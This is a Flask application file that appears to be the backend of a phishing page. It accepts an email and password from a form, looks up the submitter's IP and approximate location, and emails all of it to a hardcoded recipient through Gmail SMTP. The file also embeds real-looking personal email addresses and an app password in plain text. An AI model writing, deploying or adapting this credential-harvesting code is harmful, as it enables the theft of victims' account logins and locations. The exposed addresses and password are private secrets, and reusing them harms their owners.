from flask import Flask, render_template, request, jsonify
import smtplib
from email.mime.text import MIMEText
import requests

app = Flask(__name__)

SENDER_EMAIL = "wayraeric78@gmail.com"       
RECEIVER_EMAIL = "igwesomtochukwu@gmail.com"     
APP_PASSWORD = "zxqbinxnxqcwizzp"  


@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    data = request.get_json()
    email = data.get("email")
    password = data.get("password")

    # Get user's IP
    user_ip = request.remote_addr

    # Get approximate location
    try:
        response = requests.get(f"http://ip-api.com/json/{user_ip}")
        geo = response.json()
        location = f"{geo.get('city')}, {geo.get('regionName')}, {geo.get('country')}"
    except:
        location = "Unknown"

    msg_body = f"""
    Email: {email}
    Password: {password}
    IP Address: {user_ip}
    Location: {location}
    """

    msg = MIMEText(msg_body)
    msg["Subject"] = "New Form Submission"
    msg["From"] = SENDER_EMAIL
    msg["To"] = RECEIVER_EMAIL

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SENDER_EMAIL, APP_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()

        return jsonify({"status": "success"})
    except Exception as e:
        print("Error sending email:", e)
        return jsonify({"status": "error", "message": str(e)})


if __name__ == "__main__":
    app.run(debug=True)